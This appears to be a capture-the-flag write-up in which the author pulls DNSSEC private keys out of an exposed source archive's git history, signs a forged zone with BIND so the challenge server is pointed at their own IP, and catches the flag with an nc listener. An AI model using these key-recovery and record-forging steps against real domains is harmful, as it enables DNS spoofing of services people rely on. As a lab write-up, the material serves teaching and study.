In the page source code, an HTML comment reveals the presence of a source code archive:

```html
<!-- <a href="/static/source.zip">Source</a> -->
```

The application is Flask based and has a unique view handling a unique form input. If the submitted input is a valid IPv4 address, the server sends a DNSSEC request and asks for a DNSSEC A record for an unknown domain. The returned record is then checked with hardcoded private keys.

```python
def correct_dnssec(nsaddr, domain):
    #
    name = dns.name.from_text(domain)
    key = {
        name: dns.rrset.from_text(
            domain, 3600, 'IN', 'DNSKEY',
            '256 3 7 [...]',
            '257 3 7 [...]'
        )
    }
    request = dns.message.make_query(domain, dns.rdatatype.A, want_dnssec=True)
    try:
        request = dns.query.udp(request, nsaddr, timeout=7)
    except:
        return False
    answer = request.answer
    if len(answer) < 2:
        # dnsserc not supported
        return False
    else:
        try:
            dns.dnssec.validate(answer[0], answer[1], key)
            return str(answer[0].to_rdataset()[0])
        except:
            # dnssec failed
            return False
```

A `tcpdump` quickly reveals the domaine name for which the record is asked:

```
12:08:32.978150 IP 149.13.33.84.39499 > XXXXXXXXXXXXXXX: 1749+ [1au] A? otherside.earth.flux. (49)
```

There is currently no other possibility to forge valid DNSSEC records: we need the associated private keys. A team mate noticed that the archive contained a complete git repository, allowing us to dig into the commit history:

```
$ git log
commit bf3b232d26757f78a0c7b60b5643bd5ccaadeeef (HEAD -> master)
Author: kunte_ <rip@fluxfingers.net>
Date:   Tue Oct 3 17:58:35 2017 +0200

    added jquery

commit 94067e4502a5134d912b6964de7f23a438b7f814
Author: kunte_ <rip@fluxfingers.net>
Date:   Tue Oct 3 17:57:23 2017 +0200

    fixed gitignore

commit eddb23375ea4e08c67a63088ea08b4d5fc18a406
Author: kunte_ <rip@fluxfingers.net>
Date:   Tue Oct 3 17:56:37 2017 +0200

    fixed typo in name
```

Quickly, you can reach the project state containing these wanted keys !

```
git checkout 94067e4502a5134d912b6964de7f23a438b7f814
$ ls keys/
Ksecret+007+11537.key      Ksecret+007+26883.key
Ksecret+007+11537.private  Ksecret+007+26883.private
```

After spending a few hours googling "How to configure a BIND server with DNSSEC", I finally got a working setup.

Put all the files located in subdirectory `text` in your system `/etc/bind` directory:

  * `db.otherside.earth.flux` : the zone file
  * `Ksecret+007+11537.key` : the KSK public part
  * `Ksecret+007+11537.private` : the KSK private part
  * `Ksecret+007+26883.key` : the ZSK public part
  * `Ksecret+007+26883.private` : the ZSK private part

Patch the zone file in order to make the record otherside.earth.flux pointing to a controlled IP address:

```
@ IN A AA.BB.CC.DD
```

Once you're done, sign the zone file with you keys:
```
/etc/bind# dnssec-signzone -t -g -k Ksecret+007+26883.key -o otherside.earth.flux db.otherside.earth.flux Ksecret+007+11537.key
```

Finally, add the zone in your bind configuration file `/etc/bind/named.conf.local` and restart your BIND:

```
zone "otherside.earth.flux" {
	type master;
	file "/etc/bind/db.otherside.earth.flux.signed";
};
```

The DNSSEC server should be working and you should be able to get a signed record with the following command:

```
dig A otherside.earth.flux @localhost +noadditional +dnssec +multiline
```

The challenge is almost done, submit your IP address into the web form and monitor incoming packets with a `tcpdump` capture.

You will easily notice a SYN packet incoming on the TCP port 1337. Submit the IP again with a listening service for retrieving the flag:

```
# nc -lvp 1337
listening on [any] 1337 ...

149.13.33.84: inverse host lookup failed: Unknown host
connect to [62.210.72.56] from (UNKNOWN) [149.13.33.84] 35952
Server Hello.
flag{bb5986219c9811aa66e7ebeb05d7f757}
```
